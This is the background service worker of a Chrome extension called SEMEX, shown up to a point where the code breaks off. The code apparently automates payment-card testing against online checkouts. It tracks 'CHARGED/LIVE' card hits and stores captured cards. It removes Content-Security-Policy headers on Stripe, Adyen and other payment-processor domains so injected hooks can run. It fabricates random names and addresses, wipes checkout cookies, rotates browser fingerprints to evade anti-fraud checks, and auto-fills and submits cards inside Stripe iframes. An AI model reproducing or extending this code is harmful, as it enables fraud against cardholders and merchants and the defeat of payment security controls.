var __defProp = Object.defineProperty;
var __name = (_0x52bbce, _0x5ed2f5) => __defProp(_0x52bbce, "name", {
  value: _0x5ed2f5,
  configurable: true
});
importScripts("../crypto/encryption.js", "../shared/server-client.js");

// ─── Storage key migration (v2.7.0 security hardening) ───────────────────────
// Old key names were exposed in a source code breach. On first run after update,
// copy any existing data from old keys → new keys, then remove the old keys.
// This runs once and is harmless if keys don't exist (get returns undefined).
(async () => {
  try {
    const LOCAL_MIGRATE = {
      semexUpgradeRequired: '__xugr', semexApiUrl: '__xaurl',
      semexCheckoutTheme:   '__xcthm', semexPersistentCard: '__xpcard',
      semexPersistentCardTs:'__xpcts', semexSmartBlurEnabled:'__xsmbe',
      lastHitResult:        '__xlhr',  transactionHistory:  '__xtxh',
      pollinations:         '__xpol',  smailproEmails:      '__xspem',
      smailproGenStatus:    '__xspgs', botUsernameFetchedAt:'__xbufa',
      lastCapturedCard:     '__xlcard',
      // v2.9.14 security hardening — move auth keys to obfuscated names.
      accessToken:  _SK_AT,  refreshToken: _SK_RT,
      sessionId:    _SK_SID, userProfile:  _SK_UP,
    };
    const SESSION_MIGRATE = {
      otpPendingTelegramId: '__xotpid',
      cachedAddressBuffer:  '__xcabuf',
    };
    const _migrate = async (store, map) => {
      const old = await store.get(Object.keys(map));
      const toSet = {}, toRemove = [];
      for (const [k, nk] of Object.entries(map)) {
        if (old[k] !== undefined) { toSet[nk] = old[k]; toRemove.push(k); }
      }
      if (toRemove.length) {
        await store.set(toSet);
        await store.remove(toRemove);
      }
    };
    await _migrate(chrome.storage.local, LOCAL_MIGRATE);
    if (chrome.storage.session) await _migrate(chrome.storage.session, SESSION_MIGRATE);
  } catch (_e) { /* migration is best-effort; never crash the worker */ }
})();
// ─────────────────────────────────────────────────────────────────────────────

chrome.runtime.onInstalled.addListener(async () => {
  try {
    await serverClient.getBotUsername();
  } catch (_0x39c0b0) {}
});
// Open the full-page dashboard in a new tab when the extension icon is clicked.
// Focus the existing dashboard tab if one is already open.
chrome.action.onClicked.addListener(async () => {
  const _dashUrl = chrome.runtime.getURL("popup/dashboard.html");
  try {
    const _tabs = await chrome.tabs.query({});
    const _existing = _tabs.find(_t => _t.url && _t.url.split("#")[0] === _dashUrl);
    if (_existing) {
      await chrome.tabs.update(_existing.id, { active: true });
      if (_existing.windowId != null) {
        try { await chrome.windows.update(_existing.windowId, { focused: true }); } catch (e) {}
      }
    } else {
      await chrome.tabs.create({ url: _dashUrl });
    }
  } catch (e) {
    chrome.tabs.create({ url: _dashUrl });
  }
});

// Track the last time a card was actively filled into a tab. PAYMENT_RESULT for
// CHARGED / LIVE is only trusted when a recent fill occurred on this tab —
// otherwise stray gateway-like JSON on unrelated sites (WP admin-ajax, downloads,
// misc APIs) could fabricate a false CHARGED hit.
const _semexLastFillByTab = new Map();
const _SEMEX_FILL_WINDOW_MS = 180000; // 3 min
// BUGFIX: serialize stats read-modify-write — concurrent PAYMENT_RESULT
// handlers used to overwrite each other's counter increments.
let _semexStatsQueue = Promise.resolve();

// ---------- Cross-device state sync ----------
// Backs `statistics` + `transactionHistory` to `/api/user/state` (keyed by
// telegram_id server-side). Same telegram login on any device → same dashboard.
let _semexSyncPushTimer = null;
let _semexSyncPushing = false;
let _semexSyncPulling = false;
async function _semexSyncPushNow() {
  if (_semexSyncPushing) return;
  _semexSyncPushing = true;
  try {
    const _tok = (await chrome.storage.local.get([_SK_AT]))[_SK_AT];
    if (!_tok || !serverClient || !serverClient.baseUrl) return;
    if (!serverClient.fingerprint) { try { await serverClient.init(); } catch (_e) {} }
    const _s = await chrome.storage.local.get(["statistics", "__xtxh"]);
    const _payload = {
      data: {
        statistics: _s.statistics || null,
        // v2.8.6 FIX: local storage key is __xtxh (migrated); the old code read
        // the dead pre-migration name "transactionHistory" and pushed []. The
        // server field name stays "transactionHistory" so pull() round-trips.
        transactionHistory: Array.isArray(_s.__xtxh) ? _s.__xtxh.slice(0, 200) : [],
        pushedAt: Date.now(),
      },
    };
    // authedFetch: refresh-on-401 + retry, so sync survives the 15-min token TTL.
    await serverClient.authedFetch("/api/user/state", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(_payload),
    }).catch(() => {});
  } catch (_e) {
    console.warn("[SEMEX/sync] push failed", _e);
  } finally {
    _semexSyncPushing = false;
  }
}
function _semexSyncPushDebounced() {
  if (_semexSyncPushTimer) clearTimeout(_semexSyncPushTimer);
  _semexSyncPushTimer = setTimeout(() => { _semexSyncPushNow(); }, 2500);
}
async function _semexSyncPull() {
  if (_semexSyncPulling) return;
  _semexSyncPulling = true;
  try {
    const _tok = (await chrome.storage.local.get([_SK_AT]))[_SK_AT];
    if (!_tok || !serverClient || !serverClient.baseUrl) return;
    if (!serverClient.fingerprint) { try { await serverClient.init(); } catch (_e) {} }
    const r = await serverClient.authedFetch("/api/user/state", {});
    if (!r || !r.ok) return;
    const d = await r.json();
    const remote = d && d.data;
    if (!remote) return;
    const local = await chrome.storage.local.get(["statistics", "__xtxh"]);
    // Merge policy: server wins on statistics (server is authoritative), history
    // is merged by transactionId de-dup, most-recent first, capped at 200.
    const patch = {};
    if (remote.statistics) patch.statistics = remote.statistics;
    if (Array.isArray(remote.transactionHistory)) {
      const seen = new Set();
      const merged = [];
      // v2.8.6 FIX: local side must read __xtxh (the migrated key), not the
      // dead "transactionHistory" name.
      for (const arr of [remote.transactionHistory, Array.isArray(local.__xtxh) ? local.__xtxh : []]) {
        for (const row of arr) {
          const _k = row && (row.id || row.transactionId || (row.timestamp + "|" + (row.card || row.cardNumber || "")));
          if (!_k || seen.has(_k)) continue;
          seen.add(_k);
          merged.push(row);
        }
      }
      merged.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
      patch.__xtxh = merged.slice(0, 200);
    }
    if (Object.keys(patch).length) {
      // Suspend push while we hydrate from server (avoid immediate echo push)
      _semexSyncSuspend = true;
      await chrome.storage.local.set(patch);
      setTimeout(() => { _semexSyncSuspend = false; }, 250);
    }
  } catch (_e) {
    console.warn("[SEMEX/sync] pull failed", _e);
  } finally {
    _semexSyncPulling = false;
  }
}
let _semexSyncSuspend = false;
chrome.storage.onChanged.addListener((changes, area) => {
  if (area !== "local") return;
  if (_semexSyncSuspend) return;
  if (changes.statistics || changes.__xtxh) _semexSyncPushDebounced();
  // Fresh login → pull server state so this device sees the same data
  if (changes[_SK_AT] && changes[_SK_AT].newValue && !changes[_SK_AT].oldValue) {
    _semexSyncPull();
  }
});
// On service-worker startup, if we have a valid token, pull latest state and
// do a once-per-browser-session session validation to flush stale tokens.
(async () => {
  try {
    const _at = (await chrome.storage.local.get([_SK_AT]))[_SK_AT];
    if (_at) {
      _semexSyncPull();
      // Validate session once per browser session (session storage resets on browser close).
      // Avoids a network call on every MV3 worker wake-up cycle.
      // IMPORTANT: stamp __xsvck only AFTER a conclusive outcome so a transient
      // network failure does not consume the once-per-session check.
      try {
        const _svDone = chrome.storage.session
          ? (await chrome.storage.session.get("__xsvck")).__xsvck
          : true;
        if (!_svDone) {
          if (!serverClient.fingerprint) await serverClient.init();
          const _sv = await serverClient.verifySession();
          // Only act on conclusive outcomes — stamp the gate and optionally clear tokens.
          // Network errors (_sv.error) and server_error (5xx/426) are NOT conclusive:
          // leave tokens intact and don't stamp the gate so the next wakeup retries.
          if (_sv && !_sv.error && _sv.reason !== "server_error") {
            if (chrome.storage.session) await chrome.storage.session.set({ __xsvck: 1 });
            // Delete credentials only when the backend definitively rejected them (401/403).
            if (!_sv.valid && _sv.reason === "auth_rejected") {
              await chrome.storage.local.remove([_SK_AT, _SK_RT, _SK_SID, _SK_UP]);
            }
          }
        }
      } catch (_ve) {}
    }
  } catch (_e) {}
})();


try {
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [9990, 9991, 9992],
    addRules: [{
      id: 9991,
      priority: 1,
      action: {
        type: "modifyHeaders",
        responseHeaders: [{
          header: "content-security-policy",
          operation: "remove"
        }, {
          header: "content-security-policy-report-only",
          operation: "remove"
        }]
      },
      condition: {
        // Both competitors strip CSP on every gateway they touch, not just
        // Stripe — a strict Content-Security-Policy on the checkout page can
        // silently block our injected MAIN-world hooks (fetch/XHR patches,
        // dynamically built iframes/workers). Scoped to dedicated payment-
        // processor domains only (not roblox.com/epicgames.com — those are
        // full consumer sites where stripping CSP weakens XSS protection on
        // unrelated authenticated pages). requestDomains covers subdomains.
        requestDomains: ["stripe.com", "adyen.com", "checkout.com", "recurly.com", "xsolla.com"],
        resourceTypes: ["main_frame", "sub_frame"]
      }
    }]
  }).catch((_0xdnrErr) => {
    // updateDynamicRules is async — a rejection (bad rule, quota) would
    // otherwise be an unhandled promise rejection and the rule silently
    // never applies. Surface it so SW logs show the failure.
    try { console.warn("[SEMEX] CSP-strip rule failed:", _0xdnrErr && _0xdnrErr.message); } catch (_e2) {}
  });
} catch (_0xf31c6c) {}
chrome.runtime.onStartup.addListener(async () => {
  try {
    await serverClient.getBotUsername();
  } catch (_0x1a98df) {}
});
const _lastFillBroadcast = new Map();
function notifyBackendResult(_0xtabId, _0xok, _0xmsg, _0xstatus) {
  try {
    chrome.action.setBadgeBackgroundColor({ color: _0xok ? "#16a34a" : "#dc2626" });
    chrome.action.setBadgeText({ text: _0xok ? "\u2713" : "!" });
    setTimeout(() => { try { chrome.action.setBadgeText({ text: "" }); } catch (e) {} }, _0xok ? 3000 : 8000);
  } catch (e) {}
  if (_0xtabId) {
    try {
      chrome.tabs.sendMessage(_0xtabId, { type: "SEMEX_BACKEND_RESULT", ok: _0xok, message: _0xmsg, status: _0xstatus || "" });
    } catch (e) {}
  }
}
__name(notifyBackendResult, "notifyBackendResult");
chrome.runtime.onMessage.addListener((_0x2d827f, _0x393846, _0x2ece2b) => {
  if (_0x2d827f.type === "SEMEX_GET_API_URL") {
    try {
      const url = (typeof serverClient !== "undefined" && serverClient && serverClient.baseUrl) || "";
      _0x2ece2b({ baseUrl: url });
    } catch (_e) { try { _0x2ece2b({ baseUrl: "" }); } catch (__) {} }
    return true;
  }
  if (_0x2d827f.type === "SEMEX_SYNC_PULL") {
    _semexSyncPull().finally(() => { try { _0x2ece2b({ ok: true }); } catch (_e) {} });
    return true;
  }
  if (_0x2d827f.type === "SEMEX_SYNC_PUSH") {
    _semexSyncPushNow().finally(() => { try { _0x2ece2b({ ok: true }); } catch (_e) {} });
    return true;
  }

  if (_0x2d827f.type === "SEMEX_CLEAR_CHECKOUT_DATA") {
    // Wipe cookies + local + IndexedDB + cacheStorage + service workers for
    // the ORIGIN of the current checkout tab only (safe: your other logins
    // stay intact). Falls back to just the sender's URL origin if no url given.
    (async () => {
      try {
        // SECURITY: never trust the message's `origin` — any page running the
        // content script could ask us to wipe cookies/storage for ANOTHER
        // origin. The wipe target is derived exclusively from the sender tab.
        let origin = null;
        if (_0x393846.tab && _0x393846.tab.url) {
          try {
            const _0xu = new URL(_0x393846.tab.url);
            if (_0xu.protocol === "https:" || _0xu.protocol === "http:") {
              origin = _0xu.origin;
            }
          } catch (e) {}
        }
        if (!origin) { _0x2ece2b({ success: false, error: "no-origin" }); return; }

        // Include Stripe origins so hosted checkout iframes get wiped too, when
        // wiping a merchant site that embeds Stripe.
        const origins = [origin];
        try {
          const u = new URL(origin);
          if (!u.host.endsWith("stripe.com")) {
            origins.push("https://checkout.stripe.com");
            origins.push("https://js.stripe.com");
            origins.push("https://m.stripe.com");
          }
        } catch (e) {}

        await new Promise((res) => chrome.browsingData.remove(
          { origins },
          {
            cookies: true,
            cacheStorage: true,
            fileSystems: true,
            indexedDB: true,
            localStorage: true,
            serviceWorkers: true,
            webSQL: true,
          },
          () => res()
        ));
        _0x2ece2b({ success: true, origins });
      } catch (e) {
        _0x2ece2b({ success: false, error: e && e.message || String(e) });
      }
    })();
    return true;
  }
  if (_0x2d827f.type === "SEMEX_BUMP_FINGERPRINT") {
    // Just tell the tab's content script to bump — it forwards to MAIN world.
    if (_0x393846.tab && _0x393846.tab.id) {
      chrome.tabs.sendMessage(_0x393846.tab.id, { type: "SEMEX_AF_BUMP" });
    }
    _0x2ece2b({ success: true });
    return true;
  }
  if (_0x2d827f.type === "INJECT_JSENCRYPT") {
    if (!_0x393846.tab || !_0x393846.tab.id) {
      _0x2ece2b({
        success: false,
        error: "No tab context"
      });
      return;
    }
    const _0x1c1b41 = _0x393846.tab.id;
    chrome.scripting.executeScript({
      target: {
        tabId: _0x1c1b41,
        allFrames: true
      },
      files: ["libs/jsencrypt.min.js"],
      world: "MAIN",
      injectImmediately: true
    }).then(() => {
      _0x2ece2b({
        success: true
      });
    }).catch(_0x35cc2d => {
      _0x2ece2b({
        success: false,
        error: _0x35cc2d.message
      });
    });
    return true;
  }
  if (_0x2d827f.type === "SEMEX_BROADCAST_BLUR") {
    if (_0x393846.tab && _0x393846.tab.id) {
      chrome.tabs.sendMessage(_0x393846.tab.id, {
        type: "SEMEX_BLUR_COMMAND",
        enabled: _0x2d827f.enabled
      });
    }
    _0x2ece2b({
      success: true
    });
    return;
  }
  if (_0x2d827f.type === "CHECK_CONFIG") {
    if (_0x393846.tab && _0x393846.tab.id) {
      const _0x4bc771 = _lastFillBroadcast.get(_0x393846.tab.id) || 0;
      const _0x446a71 = Date.now();
      if (_0x446a71 - _0x4bc771 < 500) {
        _0x2ece2b({
          success: true,
          reason: "debounced"
        });
        return;
      }
      _lastFillBroadcast.set(_0x393846.tab.id, _0x446a71);
    }
    const _0x7c964d = _0x2d827f.domain;
    const _0x2b8376 = _0x2d827f.isStripeCheckout || false;
    const _0x44bec0 = _0x2d827f.force || false;
    const _0x28c6a8 = _0x2d827f.card || null;
    chrome.storage.local.get("settings").then(async _0x5628fe => {
      var _0x516de8;
      var _0x23b709;
      var _0x45f8b0;
      var _0x327444;
      var _0x210687;
      var _0x586b98;
      var _0x3972ce;
      const _0x2ee7e1 = _0x5628fe.settings || {};
      if (!_0x44bec0 && !_0x2b8376 && ((_0x516de8 = _0x2ee7e1.formFilling) == null ? undefined : _0x516de8.enabled) === false) {
        _0x2ece2b({
          success: false,
          reason: "Form filling disabled"
        });
        return;
      }
      try {
        const _0x2987d5 = await serverClient.getSelectors(_0x7c964d, _0x2b8376);
        if (!_0x2987d5 || _0x2987d5.error) {
          _0x2ece2b({
            success: false,
            reason: (_0x2987d5 == null ? undefined : _0x2987d5.error) ? "Auth error" : "No config found"
          });
          return;
        }
        let _0x24e6ca = "US";
        let _0x32a75e = false;
        if (_0x2ee7e1.addressCountryRandom) {
          _0x32a75e = true;
        } else if (_0x2ee7e1.addressFollowProxy) {
          const _0x446be0 = await chrome.storage.local.get("proxyState");
          if ((_0x23b709 = _0x446be0.proxyState) == null ? undefined : _0x23b709.countryCode) {
            _0x24e6ca = _0x446be0.proxyState.countryCode;
          }
        } else if (_0x2ee7e1.addressCountry && _0x2ee7e1.addressCountry !== "RANDOM") {
          _0x24e6ca = _0x2ee7e1.addressCountry;
        }
        const _0x40f5e8 = await serverClient.getAddress(_0x24e6ca, _0x32a75e);
        if (_0x40f5e8 && _0x40f5e8.error) {}
        const _0x37bc76 = await serverClient.getUser();
        if (_0x37bc76 && _0x37bc76.error) {}
        let _0x1bc12d = "user@semex.local";
        if (((_0x45f8b0 = _0x2ee7e1.formFilling) == null ? undefined : _0x45f8b0.randomEmail) && (_0x37bc76 == null ? undefined : _0x37bc76.email)) {
          _0x1bc12d = _0x37bc76.email;
        } else if (((_0x327444 = _0x2ee7e1.formFilling) == null ? undefined : _0x327444.customEmail) && _0x2ee7e1.formFilling.customEmail.includes("@")) {
          _0x1bc12d = _0x2ee7e1.formFilling.customEmail;
        }
        // Random-identity pools — same combinatorics as content.js and
        // identity-autofill.js (middle initial + hyphenated surname ≈ 45M combos).
        // BUGFIX: this branch used to take the server PROFILE name when Random
        // Name was on — but profiles rarely carry first/last, so the field
        // always fell back to "SEMEX Automation" and the toggle looked broken.
        // Generate a real random identity instead, per fill.
        const _SEMEX_BG_FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Daniel","Matthew","Anthony","Mark","Steven","Paul","Andrew","Joshua","Kevin","Brian","Timothy","Jason","Jeffrey","Ryan","Jacob","Nicholas","Eric","Jonathan","Stephen","Justin","Brandon","Benjamin","Samuel","Alexander","Patrick","Jack","Tyler","Aaron","Nathan","Henry","Peter","Noah","Ethan","Jeremy","Austin","Sean","Dylan","Jordan","Bryan","Gabriel","Logan","Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen","Lisa","Nancy","Margaret","Ashley","Emily","Michelle","Amanda","Melissa","Stephanie","Rebecca","Laura","Amy","Angela","Anna","Nicole","Emma","Samantha","Rachel","Olivia","Ava","Sophia","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Luna","Camila","Sofia","Scarlett","Grace","Chloe","Zoey","Lily","Eleanor","Hazel","Violet","Aurora","Mateo","Diego","Santiago","Miguel","Alejandro","Rafael","Liam","Lucas","Oliver","Elijah","Sebastian","Julian","Levi","Kai","Hiroshi","Kenji","Yuki","Wei","Arjun","Rahul","Omar","Felix","Hugo","Marco","Luca","Leon","Finn","Elias","Theo","Nora","Freya","Astrid","Ingrid","Saoirse","Priya","Ananya","Mei","Sakura","Yuna","Amara","Zara","Layla","Aisha","Fatima","Elena","Valentina","Camille","Ines","Margaux"];
        const _SEMEX_BG_LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts","Tanaka","Suzuki","Sato","Watanabe","Kim","Park","Choi","Wang","Li","Zhang","Chen","Liu","Schmidt","Muller","Fischer","Weber","Rossi","Russo","Ferrari","Silva","Santos","Oliveira","Costa","Dubois","Moreau","Laurent","Bernard","Kumar","Sharma","Patel","Singh","Novak","Kowalski","Jansen","Bakker","Larsen","Nilsson","Virtanen","Santoro","Marino","Ricci","Bruno","Greco","Conte","Moretti","Rinaldi","Ferrara","Wagner","Becker","Hoffmann","Schulz","Koch","Bauer","Richter","Klein","Wolf","Neumann"];
        const _semexBgPick = _0xa => _0xa[Math.floor(Math.random() * _0xa.length)];
        let _0x57f217;
        // Name priority: fixed customName (only when randomName OFF) → random (always default).
        if (((_0x586b98 = _0x2ee7e1.formFilling) == null ? undefined : _0x586b98.customName) && _0x2ee7e1.formFilling.customName.trim() && !(((_0x210687 = _0x2ee7e1.formFilling) == null ? undefined : _0x210687.randomName))) {
          _0x57f217 = _0x2ee7e1.formFilling.customName.trim();
        } else {
          let _semexFn = _semexBgPick(_SEMEX_BG_FIRST), _semexLn = _semexBgPick(_SEMEX_BG_LAST);
          if (Math.random() < 0.35) { let _semexS = _semexBgPick(_SEMEX_BG_LAST); if (_semexS === _semexLn) _semexS = _semexBgPick(_SEMEX_BG_LAST); _semexLn += "-" + _semexS; }
          if (Math.random() < 0.4) { _semexFn += " " + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + "."; }
          _0x57f217 = (_semexFn + " " + _semexLn).trim();
        }
        const _0x10490c = {
          selectors: _0x2987d5.selectors,
          values: {
            country: (_0x40f5e8 == null ? undefined : _0x40f5e8.countryCode) || _0x24e6ca,
            countryCode: (_0x40f5e8 == null ? undefined : _0x40f5e8.countryCode) || _0x24e6ca,
            zip: (_0x40f5e8 == null ? undefined : _0x40f5e8.zip) || (_0x40f5e8 == null ? undefined : _0x40f5e8.postalCode) || "10001",
            city: (_0x40f5e8 == null ? undefined : _0x40f5e8.city) || "New York",
            state: (_0x40f5e8 == null ? undefined : _0x40f5e8.state) || (_0x40f5e8 == null ? undefined : _0x40f5e8.stateName) || "",
            address: (_0x40f5e8 == null ? undefined : _0x40f5e8.street) || (_0x40f5e8 == null ? undefined : _0x40f5e8.line1) || "123 Main St",
            address2: (_0x40f5e8 == null ? undefined : _0x40f5e8.line2) || "",
            phone: (_0x40f5e8 == null ? undefined : _0x40f5e8.phone) || "",
            email: _0x1bc12d,
            name: _0x57f217,
            firstName: _0x57f217.split(" ")[0] || "SEMEX",
            lastName: _0x57f217.split(" ").slice(1).join(" ") || "Automation"
          }
        };
        if (_0x28c6a8) {
          // BUGFIX: card data was excluded from the payload when cardReplacement
          // was enabled (if(!enabled) → else{}). But the form fill always needs
          // the card number regardless of whether Card Replacement is also active.
          _0x10490c.values.cardNumber = _0x28c6a8.number;
          const _0x224b6b = String(_0x28c6a8.month || _0x28c6a8.exp_month || "").padStart(2, "0");
          const _0x222c75 = String(_0x28c6a8.year || _0x28c6a8.exp_year || "").slice(-2);
          _0x10490c.values.expiry = _0x224b6b + "/" + _0x222c75;
          _0x10490c.values.month = _0x224b6b;
          _0x10490c.values.year = _0x222c75;
          _0x10490c.values.cvv = _0x28c6a8.cvv || _0x28c6a8.cvc || "";
        }
        // BUGFIX: CHECK_CONFIG previously sent FILL_FORM directly to the tab but
        // never wrote to __xcabuf, so fillFormFromOverlay's GET_CACHED_FORM_DATA
        // poll always timed out (1.56s) and surfaced "config_unavailable" before
        // the fill could complete — even though the background fill was in flight.
        // Now we write the assembled config to the buffer so the poll resolves
        // in ~120ms, and fillFormFromOverlay handles the actual fill itself
        // (avoiding a double-fill race from the old direct sendMessage path).
        try {
          const _cacheEntry = {
            address: _0x40f5e8 || null,
            selectors: _0x2987d5.selectors || _0x2987d5,
            country: _0x24e6ca,
            domain: _0x7c964d || "",
            timestamp: Date.now()
          };
          chrome.storage.session.get("__xcabuf").then(_cached => {
            const _buf = (_cached && _cached.__xcabuf) || [];
            _buf.unshift(_cacheEntry);
            if (_buf.length > 10) _buf.length = 10;
            chrome.storage.session.set({ __xcabuf: _buf }).catch(() => {});
          }).catch(() => {});
        } catch (_cacheErr) {}
        _0x2ece2b({
          success: true
        });
      } catch (_0x6ec3e9) {
        _0x2ece2b({
          error: _0x6ec3e9.message
        });
      }
    }).catch(_0x220bb6 => {
      _0x2ece2b({
        error: _0x220bb6.message
      });
    });
    return true;
  }
  if (_0x2d827f.type === "FILL_FORM_SUBFRAMES") {
    // New Stripe UI (/g/pay/): the card form lives in a cross-origin
    // js.stripe.com elements-inner-habanero subframe. The main-frame fill
    // detects it cannot reach the DOM and forwards here so we can target the
    // correct subframe directly.
    const _sfTabId = _0x393846 && _0x393846.tab && _0x393846.tab.id;
    const _sfPayload = _0x2d827f.payload;
    // Notify the top frame when delivery is impossible so the overlay exits
    // its waiting state instead of hanging forever.
    const _sfFail = () => {
      if (_sfTabId) chrome.tabs.sendMessage(_sfTabId, { type: "SEMEX_FILL_FORM_SUBFRAMES_FAILED" }, { frameId: 0 }, () => { void chrome.runtime.lastError; });
    };
    if (_sfTabId && _sfPayload && chrome.webNavigation && chrome.webNavigation.getAllFrames) {
      (async () => {
        const _sfGetFrames = () => new Promise(_res => chrome.webNavigation.getAllFrames({ tabId: _sfTabId }, _f => _res(_f || [])));
        const _sfSend = _fid => new Promise(_res => chrome.tabs.sendMessage(
          _sfTabId,
          { type: "FILL_FORM", payload: _sfPayload },
          { frameId: _fid },
          (resp) => {
            // Return the full response so callers can inspect fill success,
            // not just whether the message was delivered without a runtime error.
            // Treat an empty response as success for content scripts that predate
            // the result-propagation fix (avoids breaking partial upgrades).
            if (chrome.runtime.lastError) { _res(null); return; }
            _res(resp || { success: true });
          }
        ));
        // Desktop race: at Start-click time the Stripe elements iframe may be
        // enumerated while still about:blank/srcdoc, or before its content
        // script is listening — the old single-shot delivery then silently
        // filled nothing (mobile's slower timing masked it). Retry enumeration
        // AND delivery per-frame until every js.stripe.com candidate has acked.
        const _sfAcked = new Set();
        let _sfDelivered = false;
        let _sfCardFrameAcked = false;
        // Deliver to EVERY js.stripe.com subframe that appears across the window,
        // not just whatever exists on the first pass. The old loop broke as soon
        // as ANY js.stripe.com frame acked — but controller/Link frames ack too
        // while holding no card fields, so a late-mounting elements-inner card
        // frame (slow network / lazy mount) never received the payload and the
        // checkout was silently left unfilled ("autofill works sometimes"). Keep
        // re-enumerating until the actual card frame acks (or the ~5s window ends).
        for (let _sfTry = 0; _sfTry < 12; _sfTry++) {
          const _sfFrames = await _sfGetFrames();
          for (const _sfFr of _sfFrames) {
            if (_sfFr.frameId === 0 || _sfAcked.has(_sfFr.frameId)) continue;
            // Any js.stripe.com subframe is a candidate — the content script in
            // frames without fillable fields no-ops harmlessly. (Requiring the
            // literal "elements-inner" in the URL silently skipped the frame
            // whenever Stripe renamed it, leaving the checkout unfilled.)
            // js.basistheory.com frames included for Whop (hosted-elements card
            // fields); frames without fillable fields no-op harmlessly.
            if (_sfFr.url && (_sfFr.url.includes("js.stripe.com") || _sfFr.url.includes("js.basistheory.com"))) {
              const _sfAck = await _sfSend(_sfFr.frameId);
              if (_sfAck) {
                _sfAcked.add(_sfFr.frameId);
                _sfDelivered = true;
                // Mark the card frame as acked only when its fill SUCCEEDED.
                // Previously any ack (including {success:false} from a frame
                // that crashed on undefined selectors) stopped the retry loop,
                // leaving card fields empty while the background thought it was
                // done. Now we keep retrying until the card frame reports a
                // successful fill or the 12-attempt window expires.
                if (/elements-inner|embedded-checkout-inner|hosted-elements/.test(_sfFr.url) && _sfAck.success !== false) {
                  _sfCardFrameAcked = true;
                }
              }
            }
          }
          if (_sfCardFrameAcked) break;
          await new Promise(_r => setTimeout(_r, 400));
        }
        if (!_sfDelivered) _sfFail();
      })();
    } else {
      _sfFail();
    }
    if (_0x2ece2b) _0x2ece2b({ success: true });
    return true;
  }
  if (_0x2d827f.type === "SEMEX_FILL_FORM_COMPLETE_RELAY") {
    // An iframe finished its fill (new UI) — relay completion to the top frame
    // so its content script can notify the overlay.
    // Forward ok/error unchanged so the overlay can surface empty-field failures.
    const _rcTabId = _0x393846 && _0x393846.tab && _0x393846.tab.id;
    if (_rcTabId) {
      chrome.tabs.sendMessage(_rcTabId, {
        type: "SEMEX_FILL_FORM_COMPLETE_RELAY",
        ok: _0x2d827f.ok,
        error: _0x2d827f.error
      }, { frameId: 0 }, () => { void chrome.runtime.lastError; });
    }
    if (_0x2ece2b) _0x2ece2b({ success: true });
    return true;
  }
  if (_0x2d827f.type === "CLICK_PAY_WITHOUT_LINK_SUBFRAMES") {
    // New Stripe UI (/g/pay/): executeFillSequence runs inside the elements-inner
    // iframe and sends this when its own clickPayWithoutLinkButton() poll finds
    // nothing locally (button is in a sibling js.stripe.com frame, e.g. the
    // Link authenticate frame).  Broadcast CLICK_PAY_WITHOUT_LINK to every
    // js.stripe.com sibling frame so whichever holds the "Pay without Link"
    // button dismisses it before the card-field fill writes.
    const _clTabId = _0x393846 && _0x393846.tab && _0x393846.tab.id;
    const _clSenderFid = _0x393846 && _0x393846.frameId;
    if (_clTabId && chrome.webNavigation && chrome.webNavigation.getAllFrames) {
      (async () => {
        try {
          const _clFrames = await new Promise(_res => chrome.webNavigation.getAllFrames({ tabId: _clTabId }, _f => _res(_f || [])));
          for (const _clFr of _clFrames) {
            // Skip the top frame (frameId 0) and the sender (already polling locally).
            if (_clFr.frameId === 0 || _clFr.frameId === _clSenderFid) continue;
            if (_clFr.url && _clFr.url.includes("js.stripe.com")) {
              chrome.tabs.sendMessage(_clTabId, { type: "CLICK_PAY_WITHOUT_LINK" }, { frameId: _clFr.frameId }, () => { void chrome.runtime.lastError; });
            }
          }
        } catch (_clErr) {}
      })();
    }
    if (_0x2ece2b) _0x2ece2b({ success: true });
    return true;
  }
  if (_0x2d827f.type === "TRIGGER_SUBMIT_SUBFRAMES") {
    // New Stripe checkout UI: the overlay posts SEMEX_TRIGGER_SUBMIT to the top
    // frame, but the submit button is inside the cross-origin js.stripe.com
    // elements-inner iframe. Deliver TRIGGER_SUBMIT to every js.stripe.com
    // subframe so the content script there can call triggerStripeValidation()
    // against its own document, where the button actually exists.
    // BUGFIX: the old single-shot delivery silently did nothing when the
    // elements-inner iframe wasn't enumerated yet (race with iframe mount).
    // Now retries up to 8 times (3.2 s total) until the card frame acks,
    // mirroring the reliability fix applied to FILL_FORM_SUBFRAMES.
    const _stTabId = _0x393846 && _0x393846.tab && _0x393846.tab.id;
    if (_stTabId && chrome.webNavigation && chrome.webNavigation.getAllFrames) {
      (async () => {
        const _stGetFrames = () => new Promise(_r => chrome.webNavigation.getAllFrames({ tabId: _stTabId }, _f => _r(_f || [])));
        // Return the full response object so callers can inspect {success} from
        // triggerStripeValidation — not just whether message delivery succeeded.
        const _stSend = _fid => new Promise(_r => chrome.tabs.sendMessage(
          _stTabId, { type: "TRIGGER_SUBMIT" }, { frameId: _fid },
          (resp) => { if (chrome.runtime.lastError) { _r(null); return; } _r(resp || null); }
        ));
        // Frames that confirmed an actual click — don't retry these.
        const _stClicked = new Set();
        let _stCardFrameClicked = false;
        for (let _stTry = 0; _stTry < 8; _stTry++) {
          const _stFrames = await _stGetFrames();
          for (const _stFr of _stFrames) {
            // Skip frames that already confirmed a button click.
            if (_stFr.frameId === 0 || _stClicked.has(_stFr.frameId)) continue;
            if (_stFr.url && _stFr.url.includes("js.stripe.com")) {
              const _stResp = await _stSend(_stFr.frameId);
              // _stResp is the response object {success:bool} from triggerStripeValidation,
              // or null when the message could not be delivered. Only mark clicked when the
              // content script confirmed a real button click (success:true). A frame that
              // loaded before its button renders returns {success:false} — do NOT mark it
              // as done; retry so the loop catches the button once it mounts.
              if (_stResp && _stResp.success === true) {
                _stClicked.add(_stFr.frameId);
                if (/elements-inner|embedded-checkout-inner/.test(_stFr.url)) {
                  _stCardFrameClicked = true;
                }
              }
            }
          }
